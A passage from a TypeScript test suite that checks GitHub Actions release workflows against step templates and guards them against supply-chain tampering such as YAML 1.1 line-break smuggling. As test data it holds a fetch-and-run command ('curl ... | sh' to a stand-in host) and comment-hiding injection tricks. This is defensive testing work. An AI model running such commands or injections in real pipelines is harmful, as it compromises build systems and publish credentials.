  // The 1-based number of a line in the script of one step.
  const lineNo = (template: StepTemplate[], step: number, line: string): number => {
    const found = scriptOf(template, step).indexOf(line);
    expect(found).toBeGreaterThan(-1);
    return found + 1;
  };
  // What two steps that traded places are reported as, in the order of their positions.
  const traded = (job: string, a: [number, string], b: [number, string]): string[] =>
    (
      [
        [a[0], b[1], a[1]],
        [b[0], a[1], b[1]],
      ] as Array<[number, string, string]>
    )
      .sort((x, y) => x[0] - y[0])
      .map(([at, found, wanted]) => `${job}: step ${at + 1} is "${found}", expected "${wanted}"`);

  it('python-sdk-release.yml: names the step of the publish job that a change lands on', () => {
    const steps = (w: OidcWorkflow): Step[] => stepsOf(w, 'publish');
    const DOWNLOAD = 'actions/download-artifact';
    const UPLOAD = 'Publish to PyPI (trusted publishing)';
    const [download, upload] = [DOWNLOAD, UPLOAD].map(name => place(PYTHON_PUBLISH, name));
    expectOutsideTemplate('python-sdk-release.yml', [
      [
        'the upload ahead of the download',
        exchange('publish', download, upload),
        traded('publish', [download, DOWNLOAD], [upload, UPLOAD]),
        true,
      ],
      [
        'the upload twice',
        w => void steps(w).push({ ...steps(w)[upload] }),
        [`publish: step "${UPLOAD}" appears 2 times, expected 1`],
        true,
      ],
      [
        'the download removed',
        w => void steps(w).splice(download, 1),
        [`publish: step "${DOWNLOAD}" is missing`],
        true,
      ],
      [
        'the upload renamed',
        w => (steps(w)[upload].name = 'Upload'),
        [`publish: step "Upload" is not in the template`, `publish: step "${UPLOAD}" is missing`],
        true,
      ],
      [
        'the upload by another owner under the same name',
        w => (steps(w)[upload].uses = `someone/gh-action-pypi-publish@${SHA}`),
        [
          `publish step ${upload + 1} "${UPLOAD}": uses someone/gh-action-pypi-publish@${SHA}, expected ${PYTHON_PUBLISH[upload].uses ?? ''} at a commit`,
        ],
      ],
      [
        'a step that is not in the template',
        w => void steps(w).push({ run: SCRIPT }),
        ['publish: step "a step without a name or an action" is not in the template'],
      ],
    ]);
  });

  it('js-sdk-release.yml: names the step of the publish job that a change lands on', () => {
    const steps = (w: OidcWorkflow): Step[] => stepsOf(w, 'publish');
    const SETUP = 'actions/setup-node';
    const NPM = 'Use an npm that supports trusted publishing';
    const DOWNLOAD = 'actions/download-artifact';
    const PUBLISH = 'Publish to npm (trusted publishing, provenance automatic)';
    const [setup, npm, download, publish] = [SETUP, NPM, DOWNLOAD, PUBLISH].map(name => place(JS_PUBLISH, name));
    const npmRun = scriptOf(JS_PUBLISH, npm);
    const lastNpm = show(npmRun[npmRun.length - 1]);
    const publishLine = show(scriptOf(JS_PUBLISH, publish)[0]);
    expectOutsideTemplate('js-sdk-release.yml', [
      ...(
        [
          ['a floating HTTP client pin', 4, 'undici@6.29.1', 'undici@latest'],
          ['HTTP client install scripts enabled', 4, ' --ignore-scripts', ''],
          ['removal outside the HTTP client package', 5, '"$npm_bundle_dir/undici"', '"$npm_bundle_dir"'],
        ] as const
      ).map(([label, index, from, to]): TemplateCase => {
        const original = show(npmRun[index]);
        const changed = original.replace(from, to);
        return [
          label,
          w => swap(steps(w)[npm], original, changed),
          [`publish step ${npm + 1} "${NPM}": run line ${index + 1}: ${changed}, expected ${original}`],
        ];
      }),
      [
        'the publish ahead of the npm it needs',
        exchange('publish', npm, publish),
        traded('publish', [npm, NPM], [publish, PUBLISH]),
        true,
      ],
      [
        'the download twice',
        w => void steps(w).splice(download + 1, 0, { ...steps(w)[download] }),
        [`publish: step "${DOWNLOAD}" appears 2 times, expected 1`],
        true,
      ],
      ['the npm install removed', w => void steps(w).splice(npm, 1), [`publish: step "${NPM}" is missing`], true],
      [
        'a permitted line twice in the step',
        w => (steps(w)[npm].run = `${steps(w)[npm].run ?? ''}${lastNpm}\n`),
        [`publish step ${npm + 1} "${NPM}": run line ${npmRun.length + 1}: ${lastNpm}, expected the script to end`],
        true,
      ],
      [
        'the permitted lines in the other order',
        w => exchangeLines(steps(w)[npm], [0, npmRun[0]], [1, npmRun[1]]),
        [`publish step ${npm + 1} "${NPM}": run line 1: ${show(npmRun[1])}, expected ${show(npmRun[0])}`],
        true,
      ],
      [
        'the publish with another flag',
        w => swap(steps(w)[publish], '--access public', '--access restricted'),
        [
          `publish step ${publish + 1} "${PUBLISH}": run line 1: ${publishLine.replace('--access public', '--access restricted')}, expected ${publishLine}`,
        ],
      ],
      [
        'the download inputs given as a string',
        w => (steps(w)[download].with = 'name: js-sdk-package'),
        [`publish step ${download + 1} "${DOWNLOAD}": with is not a mapping`],
      ],
      [
        'a node version of another shape',
        w => (inputsOf(steps(w)[setup])['node-version'] = 'latest'),
        [
          `publish step ${setup + 1} "${SETUP}": with node-version: latest, expected ${show(JS_PUBLISH[setup].with?.['node-version'] ?? '')}`,
        ],
      ],
    ]);
  });

  it('release.yml: names the step of the promote job that a change lands on', () => {
    const steps = (w: OidcWorkflow): Step[] => stepsOf(w, 'promote');
    const BUILDX = 'Set up Docker Buildx';
    const GHCR = 'Login to GitHub Container Registry';
    const HUB = 'Login to Docker Hub';
    const RESOLVE = 'Resolve the image name to attest';
    const ATTEST = 'Attest build provenance for the tested digest';
    const TAG = 'Tag the smoke-tested image with the release tags';
    const VERIFY = 'Verify the release tag resolves and is multi-arch';
    const [buildx, ghcr, hub, resolve, attest, tag, verify] = [BUILDX, GHCR, HUB, RESOLVE, ATTEST, TAG, VERIFY].map(
      name => place(IMAGE_PROMOTE, name),
    );
    const at = (n: number, name: string): string => `promote step ${n + 1} "${name}"`;
    const GITHUB_TOKEN = '${{ secrets.GITHUB_TOKEN }}';
    const HUB_TOKEN = '${{ secrets.DOCKERHUB_TOKEN }}';
    const HUB_USER = '${{ secrets.DOCKERHUB_USERNAME }}';
    const ACTOR = '${{ github.actor }}';
    const PROMOTING = 'echo "promoting -> $tag"';
    const CREATE = 'docker buildx imagetools create --tag "$tag" "$staging"';
    const COMPARE = 'if [ "$promoted_digest" != "$EXPECTED_DIGEST" ]; then';
    const STAGING_COMPARE = 'if [ "$actual" != "$EXPECTED_DIGEST" ]; then';
    const tagRun = scriptOf(IMAGE_PROMOTE, tag);
    const verifyRun = scriptOf(IMAGE_PROMOTE, verify);
    // The line that follows PROMOTING is the one an inserted line displaces.
    const afterPromoting = tagRun[lineNo(IMAGE_PROMOTE, tag, PROMOTING)];
    expectOutsideTemplate('release.yml', [
      [
        'the attest step after the re-point',
        exchange('promote', attest, tag),
        traded('promote', [attest, ATTEST], [tag, TAG]),
        true,
      ],
      [
        'the two logins in the other order',
        exchange('promote', ghcr, hub),
        traded('promote', [ghcr, GHCR], [hub, HUB]),
        true,
      ],
      [
        'the re-point step twice',
        w => void steps(w).push({ ...steps(w)[tag] }),
        [`promote: step "${TAG}" appears 2 times, expected 1`],
        true,
      ],
      [
        'the attest step twice',
        w => void steps(w).splice(attest, 0, { ...steps(w)[attest] }),
        [`promote: step "${ATTEST}" appears 2 times, expected 1`],
        true,
      ],
      ['the Docker Hub login removed', w => void steps(w).splice(hub, 1), [`promote: step "${HUB}" is missing`], true],
      ['the attest step removed', w => void steps(w).splice(attest, 1), [`promote: step "${ATTEST}" is missing`], true],
      [
        'the two login passwords swapped',
        w => {
          inputsOf(steps(w)[ghcr]).password = HUB_TOKEN;
          inputsOf(steps(w)[hub]).password = GITHUB_TOKEN;
        },
        [
          `${at(ghcr, GHCR)}: with password: ${HUB_TOKEN}, expected ${GITHUB_TOKEN}`,
          `${at(hub, HUB)}: with password: ${GITHUB_TOKEN}, expected ${HUB_TOKEN}`,
        ],
        true,
      ],
      [
        'both logins given the same password',
        w => (inputsOf(steps(w)[hub]).password = GITHUB_TOKEN),
        [`${at(hub, HUB)}: with password: ${GITHUB_TOKEN}, expected ${HUB_TOKEN}`],
        true,
      ],
      [
        'the Docker Hub login given the registry login name',
        w => (inputsOf(steps(w)[hub]).username = ACTOR),
        [`${at(hub, HUB)}: with username: ${ACTOR}, expected ${HUB_USER}`],
        true,
      ],
      [
        'the registry login given the Docker Hub name',
        w => (inputsOf(steps(w)[ghcr]).username = HUB_USER),
        [`${at(ghcr, GHCR)}: with username: ${HUB_USER}, expected ${ACTOR}`],
        true,
      ],
      [
        'a registry on the Docker Hub login',
        w => (inputsOf(steps(w)[hub]).registry = 'ghcr.io'),
        [`${at(hub, HUB)}: with registry`],
        true,
      ],
      [
        'the registry dropped from the first login',
        w => delete inputsOf(steps(w)[ghcr]).registry,
        [`${at(ghcr, GHCR)}: with registry is missing`],
      ],
      [
        'the attest subject name changed',
        w => (inputsOf(steps(w)[attest])['subject-name'] = '${{ needs.docker.outputs.digest }}'),
        [
          `${at(attest, ATTEST)}: with subject-name: \${{ needs.docker.outputs.digest }}, expected \${{ steps.image.outputs.name }}`,
        ],
      ],
      [
        'another action under the name of the builder step',
        w => (steps(w)[buildx].uses = `docker/login-action@${SHA}`),
        [
          `${at(buildx, BUILDX)}: uses docker/login-action@${SHA}, expected ${IMAGE_PROMOTE[buildx].uses ?? ''} at a commit`,
        ],
        true,
      ],
      [
        'the builder step renamed',
        w => (steps(w)[buildx].name = 'Builder'),
        [`promote: step "Builder" is not in the template`, `promote: step "${BUILDX}" is missing`],
        true,
      ],
      [
        'the image step with another id',
        w => ((steps(w)[resolve] as Step & { id?: string }).id = 'name'),
        [`${at(resolve, RESOLVE)}: id name, expected ${IMAGE_PROMOTE[resolve].id ?? ''}`],
        true,
      ],
      [
        'an env on a login step',
        w => (steps(w)[ghcr].env = { REPO: '${{ github.repository }}' }),
        [`${at(ghcr, GHCR)}: step key env`],
        true,
      ],
      [
        'the digest handed to the verify step',
        w =>
          (steps(w)[verify].env = {
            ...(steps(w)[verify].env as object),
            EXPECTED_DIGEST: '${{ needs.docker.outputs.digest }}',
          }),
        [`${at(verify, VERIFY)}: env EXPECTED_DIGEST`],
        true,
      ],
      ['the env dropped from the verify step', w => delete steps(w)[verify].env, [`${at(verify, VERIFY)}: no env`]],
      [
        'an exit inside the loop',
        w => swap(steps(w)[tag], PROMOTING, `${PROMOTING}\nexit 1`),
        [
          `${at(tag, TAG)}: run line ${lineNo(IMAGE_PROMOTE, tag, PROMOTING) + 1}: exit 1, expected ${show(afterPromoting)}`,
        ],
        true,
      ],
      [
        'a continue ahead of the re-point',
        w => swap(steps(w)[tag], CREATE, `continue\n${CREATE}`),
        [`${at(tag, TAG)}: run line ${lineNo(IMAGE_PROMOTE, tag, CREATE)}: continue, expected ${CREATE}`],
        true,
      ],
      [
        'a fi after the verify script',
        w => (steps(w)[verify].run = `${steps(w)[verify].run ?? ''}fi\n`),
        [`${at(verify, VERIFY)}: run line ${verifyRun.length + 1}: fi, expected the script to end`],
        true,
      ],
      [
        'the promoted digest compared as the staging digest',
        w => swap(steps(w)[tag], COMPARE, STAGING_COMPARE),
        [`${at(tag, TAG)}: run line ${lineNo(IMAGE_PROMOTE, tag, COMPARE)}: ${STAGING_COMPARE}, expected ${COMPARE}`],
        true,
      ],
      [
        'the first lines of the script in the other order',
        w => exchangeLines(steps(w)[tag], [0, tagRun[0]], [1, tagRun[1]]),
        [`${at(tag, TAG)}: run line 1: ${show(tagRun[1])}, expected ${show(tagRun[0])}`],
        true,
      ],
      [
        'the verify script cut short',
        w => swap(steps(w)[verify], show(verifyRun[verifyRun.length - 1]), ''),
        [
          `${at(verify, VERIFY)}: run ends after line ${verifyRun.length - 1}, expected ${show(verifyRun[verifyRun.length - 1])}`,
        ],
      ],
      [
        'a step that is not in the template',
        w => void steps(w).push({ run: SCRIPT }),
        ['promote: step "a step without a name or an action" is not in the template'],
      ],
      [
        'the grant on another job',
        w => (jobOf(w, 'docker').permissions = { packages: 'write', 'id-token': 'write' }),
        ['docker: no step template'],
      ],
    ]);
  });

  // The cases above name lines by their place among the lines that carry a command, so a comment written
  // between two of them, which the template accepts, does not turn a case into a failure of its own.
  it('trades the lines that carry a command whatever comments sit between them', () => {
    const step: Step = { run: 'first\n# a note\n\nsecond\nthird\n' };
    exchangeLines(step, [0, 'first'], [1, 'second']);
    expect(step.run).toBe('second\n# a note\n\nfirst\nthird\n');
  });

  it('js-sdk-release.yml: names what the allow-list refuses in the publish job', () => {
    const NPM = 'Use an npm that supports trusted publishing';
    const PUBLISH = 'Publish to npm (trusted publishing, provenance automatic)';
    const step = (w: OidcWorkflow, name: string): Step => {
      const found = stepsOf(w, 'publish').find(item => item.name === name);
      if (!found) throw new Error(`no step ${name}`);
      return found;
    };
    const publishLine = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, PUBLISH))[0]);
    const npmLine = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, NPM))[1]);
    expectRefused('js-sdk-release.yml', [
      ...placing('publish', ['build']),
      ...commented(publishLine).map(([where, text]): [string, Edit, string[]] => [
        `an expression in a comment ${where} the publish`,
        w => swap(step(w, PUBLISH), publishLine, text),
        [inComment('publish', PUBLISH)],
      ]),
      ...commented(npmLine).map(([where, text]): [string, Edit, string[]] => [
        `an expression in a comment ${where} the npm check`,
        w => swap(step(w, NPM), npmLine, text),
        [inComment('publish', NPM)],
      ]),
    ]);
  });

  // What the template must not refuse: an action moved to a newer commit, and a comment written or reworded.
  // The edits are made on the text of the real files, because a comment does not survive being parsed.
  describe('the step template accepts a bumped action and a changed comment', () => {
    const textOf = (file: string): string => fs.readFileSync(path.join(workflowDir, file), 'utf8');
    const BUMPED = 'f'.repeat(40);
    const PIN = /@[0-9a-f]{40}( # v[\w.]+)/g;
    const refusedAfter = (
      file: string,
      edit: (text: string) => string,
    ): { found: string[]; workflow: OidcWorkflow } => {
      const edited = edit(textOf(file));
      expect(edited).not.toBe(textOf(file));
      const workflow = yaml.load(edited) as OidcWorkflow;
      const list = ALLOW_LISTS[file];
      return { found: [...outsideAllowList(workflow, list), ...outsideStepTemplate(workflow, list)], workflow };
    };

    it.each(Object.keys(ALLOW_LISTS))('%s: a Dependabot bump of every action is accepted', file => {
      const { found, workflow } = refusedAfter(file, text => text.replace(PIN, `@${BUMPED} # v99.1.0`));
      // Non-vacuity: every action of the id-token job carries the new commit, so the bump landed.
      const pinned = oidcJobSteps(workflow).flatMap(({ step }) => (step.uses === undefined ? [] : [step.uses]));
      expect(pinned.length).toBeGreaterThan(0);
      expect(pinned.filter(uses => !uses.endsWith(`@${BUMPED}`))).toEqual([]);
      expect(found).toEqual([]);
    });

    // A comment is read from where the script has it, so the edits need no line of the file to be as it is
    // today: every line of every script of the id-token job gets a comment above it, on it and below it.
    it.each(Object.keys(ALLOW_LISTS))('%s: a comment above, on and below every script line is accepted', file => {
      const copy = JSON.parse(JSON.stringify(loadOidcWorkflow(file))) as OidcWorkflow;
      let scripts = 0;
      for (const [, def] of oidcJobs(copy)) {
        for (const step of def.steps ?? []) {
          if (step.run === undefined) continue;
          scripts += 1;
          step.run = step.run
            .split('\n')
            .flatMap(line => {
              if (line.trim() === '') return [line];
              const on = line.endsWith('\\') ? line : `${line} # note on it`;
              return ['# note above it', on, '# note below it'];
            })
            .join('\n');
        }
      }
      // Non-vacuity: the scripts the template lists are the scripts that were commented.
      const listed = Object.values(ALLOW_LISTS[file].jobs).flatMap(job => job.steps.filter(step => step.run));
      expect(scripts).toBe(listed.length);
      expect([...outsideAllowList(copy, ALLOW_LISTS[file]), ...outsideStepTemplate(copy, ALLOW_LISTS[file])]).toEqual(
        [],
      );
    });

    it.each(Object.keys(ALLOW_LISTS))('%s: every whole-line comment reworded is accepted', file => {
      const { found } = refusedAfter(file, text => text.replace(/^([ \t]*#[ \t]*)(\S.*)$/gm, '$1reworded: $2'));
      expect(found).toEqual([]);
    });

    // Shell expansions and braces in a comment are not an expression: only `${{` is.
    it('release.yml: a comment holding ${REPO,,}, ${tag} and a pair of braces is accepted', () => {
      const copy = JSON.parse(JSON.stringify(loadOidcWorkflow('release.yml'))) as OidcWorkflow;
      const tag = stepsOf(copy, 'promote').find(
        step => step.name === 'Tag the smoke-tested image with the release tags',
      );
      expect(tag).toBeDefined();
      swap(
        tag as Step,
        'echo "promoting -> $tag"',
        '# ${REPO,,} and ${tag} are names, {{ and }} are not an expression\necho "promoting -> $tag"',
      );
      expect([
        ...outsideAllowList(copy, ALLOW_LISTS['release.yml']),
        ...outsideStepTemplate(copy, ALLOW_LISTS['release.yml']),
      ]).toEqual([]);
    });
  });

  // Every gate above reads the files with js-yaml, a YAML 1.2 reader, for which a comment runs to LF or CR.
  // A YAML 1.1 reader (libyaml, YamlDotNet) also ends it at U+0085, U+2028 and U+2029 and reads the rest of the
  // physical line as YAML, so `# note<U+0085>curl x | sh` is one comment to the gates and a comment plus a
  // command, a step or a permission to that reader, and nothing above can tell. The raw text is scanned
  // instead: those three, and the control characters a 1.1 reader refuses and js-yaml passes, are in no file
  // GitHub reads. LF, CR and tab are white space or line ends in both and stay.
  describe('the files GitHub reads hold no line break that only a YAML 1.1 reader honours', () => {
    const githubDir = path.join(workflowDir, '..');
    const yamlFiles = (dir: string): string[] =>
      fs.readdirSync(dir, { withFileTypes: true }).flatMap(entry => {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) return yamlFiles(full);
        return /\.ya?ml$/.test(entry.name) ? [path.relative(githubDir, full).split(path.sep).join('/')] : [];
      });
    const DIVERGENT = /[\p{Cc}\p{Zl}\p{Zp}]/gu;
    const codePoint = (char: string): string => `U+${char.charCodeAt(0).toString(16).toUpperCase().padStart(4, '0')}`;
    // One entry per character, named by file and line (counted in LF, as an editor does).
    const divergentIn = (name: string, text: string): string[] =>
      text
        .split('\n')
        .flatMap((line, i) =>
          [...line.matchAll(DIVERGENT)]
            .filter(match => match[0] !== '\t' && match[0] !== '\r')
            .map(match => `${name}:${i + 1}: ${codePoint(match[0])}`),
        );
    const [NEL, LS, PS] = [0x85, 0x2028, 0x2029].map(code => String.fromCharCode(code));
    const NEL_LS_PS = new RegExp(`[${NEL}${LS}${PS}]`, 'g');

    it('finds the workflows, the Dependabot configuration and the other YAML files', () => {
      expect(yamlFiles(githubDir)).toEqual(
        expect.arrayContaining(['dependabot.yml', ...workflows.map(file => `workflows/${file}`)]),
      );
    });

    it.each(yamlFiles(githubDir))('%s holds none', name => {
      expect(divergentIn(name, fs.readFileSync(path.join(githubDir, name), 'utf8'))).toEqual([]);
    });

    it('names a character by file and line, and leaves what both readings agree on', () => {
      const text = `a: 1\n# x${NEL}y\n\tb: 2\r\nc: ${LS}${PS}\n`;
      expect(divergentIn('f.yml', text)).toEqual(['f.yml:2: U+0085', 'f.yml:4: U+2028', 'f.yml:4: U+2029']);
      for (const code of [0x0b, 0x0c, 0x1b, 0x7f, 0x90]) {
        expect(divergentIn('f.yml', `# a${String.fromCharCode(code)}b\n`)).toEqual([
          `f.yml:1: ${codePoint(String.fromCharCode(code))}`,
        ]);
      }
      // What the shipped files do hold: a dash, an arrow, a box-drawing rule, a variation selector.
      const printable = [0x2014, 0x2192, 0x2500, 0xfe0f, 0xa0].map(code => String.fromCharCode(code)).join('');
      expect(divergentIn('f.yml', `# ${printable}\n`)).toEqual([]);
    });

    // Each of the four shapes the gates above read as green. They are made on the text of the real files; a
    // reader that ends the comment at the break sees the injected line as YAML, which the same gates refuse
    // once the break is an LF, so the scan is the one thing that stands between that line and the job.
    const afterLine = (text: string, command: string, inserted: string): string => {
      const lines = text.split('\n');
      const at = lines.flatMap((line, i) => (executableLines(line).trim() === command ? [i] : []));
      expect([command, at.length]).toEqual([command, 1]);
      lines.splice(at[0] + 1, 0, inserted);
      return lines.join('\n');
    };
    const gatesRefuse = (file: string, source: string): string[] => {
      const workflow = yaml.load(source) as OidcWorkflow;
      return [...outsideAllowList(workflow, ALLOW_LISTS[file]), ...outsideStepTemplate(workflow, ALLOW_LISTS[file])];
    };
    const COMMAND = 'curl -fsSL https://example.test/x.sh | sh';
    // The lines are the ones the templates name, so a template edit moves the case with it.
    const npmCheck = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, 'Use an npm that supports trusted publishing'))[1]);
    const stagingLine = show(
      scriptOf(IMAGE_PROMOTE, place(IMAGE_PROMOTE, 'Tag the smoke-tested image with the release tags'))[1],
    );
    const repros: Array<[label: string, file: string, after: string, text: (brk: string) => string, found: string]> = [
      [
        'a command after a comment in the npm step',
        'js-sdk-release.yml',
        npmCheck,
        brk => `          # note${brk}          ${COMMAND}`,
        `publish: ${COMMAND}`,
      ],
      [
        'a command after a comment in the tag step',
        'release.yml',
        stagingLine,
        brk => `          # note${brk}          ${COMMAND}`,
        `promote: ${COMMAND}`,
      ],
      [
        'a step after a comment between the steps',
        'js-sdk-release.yml',
        'path: package/',
        brk => `      # n${brk}      - run: ${COMMAND}`,
        `publish: ${COMMAND}`,
      ],
      [
        'a permission after a comment in the permissions',
        'js-sdk-release.yml',
        'id-token: write',
        brk => `      # n${brk}      packages: write`,
        'publish: permission packages: write',
      ],
    ];
    for (const [label, file, after, text, found] of repros) {
      it.each([NEL, LS, PS].map(brk => [codePoint(brk), brk]))(`${file}: refuses ${label} behind %s`, (_name, brk) => {
        const source = fs.readFileSync(path.join(workflowDir, file), 'utf8');
        const edited = afterLine(source, after, text(brk));
        // Read as YAML 1.2 it is a comment, so every gate above is green.
        expect(gatesRefuse(file, edited)).toEqual([]);
        // The scan names the file and the line.
        const at = edited.split('\n').findIndex(line => line.includes(brk)) + 1;
        expect(divergentIn(`workflows/${file}`, edited)).toEqual([`workflows/${file}:${at}: ${codePoint(brk)}`]);
        // Read as YAML 1.1 reads it, the same gates refuse what it injects.
        expect(gatesRefuse(file, edited.replace(NEL_LS_PS, '\n'))).toContain(found);
      });
    }
  });

  // npm reads `dir/file.tgz` as the GitHub shorthand user/repo (hosted-git-info is tried before the file
  // check), and the pinned npm refuses git specs by default, so a tarball is named by an absolute path.
  const publishTarget = (source: string | OidcWorkflow): string => {
    // The first publish the shell may run is the one held to the form, so the lines are read exactly.
    const runs = oidcJobRuns(source)
      .map(({ run }) => run)
      .join('\n');
    return /\bnpm publish\s+(?:-\S+\s+)*(\S+)/.exec(runs)?.[1] ?? '';
  };
  const FILE_FORM = /^(?:"?\$\{?GITHUB_WORKSPACE\}?"?|)\/[^\s]*\.tgz$/;

  it('js-sdk-release.yml: the publish step names the tarball in a form npm reads as a file', () => {
    expect(publishTarget('js-sdk-release.yml')).toMatch(FILE_FORM);
  });

  it('js-sdk-release.yml: refuses a first publish that names a path npm reads as a repository', () => {
    const copy = (run: string): OidcWorkflow => {
      const workflow = JSON.parse(JSON.stringify(loadOidcWorkflow('js-sdk-release.yml'))) as OidcWorkflow;
      stepsOf(workflow, 'publish').unshift({ run });
      return workflow;
    };
    // A `#` after a blank the shell does not skip is no comment, so the publish after the `;` runs first.
    for (const blank of [...BLANK_LOOKALIKES, String.fromCharCode(0x2028)]) {
      expect(publishTarget(copy(`echo x${blank}#; npm publish package/x.tgz`))).not.toMatch(FILE_FORM);
    }
    expect(publishTarget(copy('npm publish package/x.tgz'))).not.toMatch(FILE_FORM);
    // Behind a space it is a comment, which is not a publish.
    expect(publishTarget(copy('echo x # npm publish package/x.tgz'))).toMatch(FILE_FORM);
  });

  // The caches a setup action restores are written by jobs that run third-party test code. A job that
  // holds a publish credential executes what it restores, with that credential in its environment. A job
  // holds one when it can mint a token, or passes a secret other than the run's own token as a step input,
  // an environment value or in a command line, or carries one in its own environment.
  const SECRET_REF = /\bsecrets(?:\.(?!GITHUB_TOKEN\b)|\s*\[|\s*\))/;
  const cachesBesideCredential = (workflow: OidcWorkflow): string[] => {
    const holdsCredential = (def: OidcJob): boolean =>
      grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions) ||
      SECRET_REF.test(JSON.stringify(workflow.env ?? {})) ||
      SECRET_REF.test(JSON.stringify(def.env ?? {})) ||
      (def.steps ?? []).some(step => SECRET_REF.test(JSON.stringify([step.env, step.with, step.run])));
    return Object.entries(workflow.jobs ?? {})
      .filter(([, def]) => holdsCredential(def))
      .flatMap(([job, def]) =>
        (def.steps ?? [])
          .filter(step => {
            const inputs = (step.with ?? {}) as Record<string, unknown>;
            return (step.uses ?? '').startsWith('actions/cache') || inputs.cache !== undefined;
          })
          .map(step => `${job}: ${step.uses ?? step.name ?? 'step'} restores a cache`),
      );
  };

  it.each(workflows.filter(file => /-sdk-release\.yml$/.test(file)))(
    '%s: a job that holds a publish credential restores no cache',
    file => {
      expect(cachesBesideCredential(loadOidcWorkflow(file))).toEqual([]);
    },
  );

  // -DskipTests only skips running the tests: the test sources are still compiled against every test
  // dependency, and javac runs the annotation processors it finds on that classpath beside the credentials.
  it('java-sdk-release.yml: the deploy compiles no test sources', () => {
    const workflow = workflowOf('java-sdk-release.yml');
    const steps = Object.values(workflow.jobs ?? {}).flatMap(job => job.steps ?? []);
    const deployLines = (read: (run: string) => string): string[] =>
      steps
        .map(step => read(step.run ?? ''))
        .join('\n')
        .split('\n')
        .filter(line => /\bmvn\b.*\bdeploy\b/.test(line));
    // A deploy that is only named behind a '#' that may start a comment is not there; every line that the
    // shell may run as one is held to the flags.
    expect(deployLines(executableLinesConservative).length).toBeGreaterThan(0);
    for (const line of deployLines(executableLines)) {
      expect(line).toContain('-Dmaven.test.skip=true');
      expect(line).not.toContain('-DskipTests');
    }
  });

  it('finds a cache restored beside a publish credential', () => {
    const withSecret = (job: Record<string, unknown>): OidcWorkflow => ({ jobs: { publish: job } });
    const setupJava = {
      uses: 'actions/setup-java@v6',
      with: { cache: 'maven', 'gpg-private-key': '${{ secrets.GPG_KEY }}' },
    };
    expect(cachesBesideCredential(withSecret({ steps: [setupJava] }))).toEqual([
      'publish: actions/setup-java@v6 restores a cache',
    ]);
    // The credential may reach the job through its environment or a command line, not only a step input.
    const cacheOnly = { uses: 'actions/setup-node@v6', with: { cache: 'npm' } };
    expect(
      cachesBesideCredential(withSecret({ env: { TOKEN: '${{ secrets.NPM_TOKEN }}' }, steps: [cacheOnly] })),
    ).toEqual(['publish: actions/setup-node@v6 restores a cache']);
    expect(
      cachesBesideCredential(withSecret({ steps: [cacheOnly, { run: 'deploy --token ${{ secrets.DEPLOY_TOKEN }}' }] })),
    ).toEqual(['publish: actions/setup-node@v6 restores a cache']);
    // A job that holds nothing may restore one, and the run's own token is not a publish credential.
    expect(cachesBesideCredential(withSecret({ steps: [cacheOnly] }))).toEqual([]);
    expect(
      cachesBesideCredential(
        withSecret({ steps: [{ ...cacheOnly, env: { GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}' } }] }),
      ),
    ).toEqual([]);
    expect(
      cachesBesideCredential({
        permissions: { 'id-token': 'write' },
        jobs: { publish: { steps: [{ uses: 'actions/cache@v4' }] } },
      }),
    ).toEqual(['publish: actions/cache@v4 restores a cache']);
  });
});

/**
 * A publish job checks nothing out: what it publishes is whatever its build job uploaded under the
 * artifact name it downloads, found where it downloads it. Neither job can see the other's text at run
 * time, so the pair has to agree here, before the first tag.
 *
 * upload-artifact stores a single glob under the directory that holds it, so the tarball carries no
 * directory part; download-artifact by name extracts into the given path itself. `if-no-files-found:
 * error` stops a build that packed nothing, and the pinned npm refuses both a glob that matched nothing
 * (ENOENT) and a second tarball (a usage error for two arguments), so the publish takes exactly one
 * file or fails.
 */
describe('a publish job takes the artifact its build job uploads', () => {
  type FlowStep = Omit<Step, 'with'> & { with?: Record<string, string>; 'working-directory'?: string };
  type FlowJob = {
    needs?: string | string[];
    defaults?: { run?: { 'working-directory'?: string } };
    steps?: FlowStep[];
  };
  const jobsOf = (file: string): Record<string, FlowJob> =>
    (workflowOf(file) as unknown as { jobs: Record<string, FlowJob> }).jobs;
  const only = (job: FlowJob, action: string): FlowStep => {
    const found = (job.steps ?? []).filter(step => (step.uses ?? '').startsWith(`${action}@`));
    expect(found).toHaveLength(1);
    return found[0];
  };
  const indexOfUses = (job: FlowJob, action: string): number =>
    (job.steps ?? []).findIndex(step => (step.uses ?? '').startsWith(`${action}@`));
  const dirOf = (target: string | undefined): string => (target ?? '').replace(/\/+$/, '');
  // Read exactly: the first publish line the shell may run is the one that has to name the artifact.
  const runsOf = (job: FlowJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');

  it('js-sdk-release.yml: the tarball npm pack writes is the one the publish step names', () => {
    const { build, publish } = jobsOf('js-sdk-release.yml');
    const upload = only(build, 'actions/upload-artifact');
    const download = only(publish, 'actions/download-artifact');
    // `npm pack` writes into the working directory of its step, and the upload names that directory's
    // tarballs: one pattern, one level, so one search path and no directory in the stored name.
    const pack = (build.steps ?? []).findIndex(step => /^npm pack$/m.test(executableLines(step.run ?? '')));
    expect(pack).toBeGreaterThan(-1);
    expect(pack).toBeLessThan((build.steps ?? []).indexOf(upload));
    expect((build.steps ?? [])[pack]['working-directory']).toBeUndefined();
    expect(upload.with?.path).toBe(`${build.defaults?.run?.['working-directory']}/*.tgz`);
    expect(upload.with?.['if-no-files-found']).toBe('error');
    // The two jobs agree on the artifact and on where it lands, and the download runs first.
    expect(download.with?.name).toBe(upload.with?.name);
    expect([publish.needs ?? []].flat()).toContain('build');
    const target = /^npm publish\s+(?:-\S+\s+)*(\S+)/m.exec(runsOf(publish))?.[1];
    expect(target).toBe(
      `"$GITHUB_WORKSPACE"/${dirOf(download.with?.path)}/${path.posix.basename(upload.with?.path ?? '')}`,
    );
    const publishAt = (publish.steps ?? []).findIndex(step => /^npm publish\b/m.test(executableLines(step.run ?? '')));
    expect(indexOfUses(publish, 'actions/download-artifact')).toBeLessThan(publishAt);
  });

  it('python-sdk-release.yml: the files python -m build writes are the ones the publish step uploads', () => {
    const { build, publish } = jobsOf('python-sdk-release.yml');
    const upload = only(build, 'actions/upload-artifact');
    const download = only(publish, 'actions/download-artifact');
    const pypi = only(publish, 'pypa/gh-action-pypi-publish');
    // `python -m build` writes dist/ under the working directory of its step.
    const built = (build.steps ?? []).find(step => /^python -m build$/m.test(executableLines(step.run ?? '')));
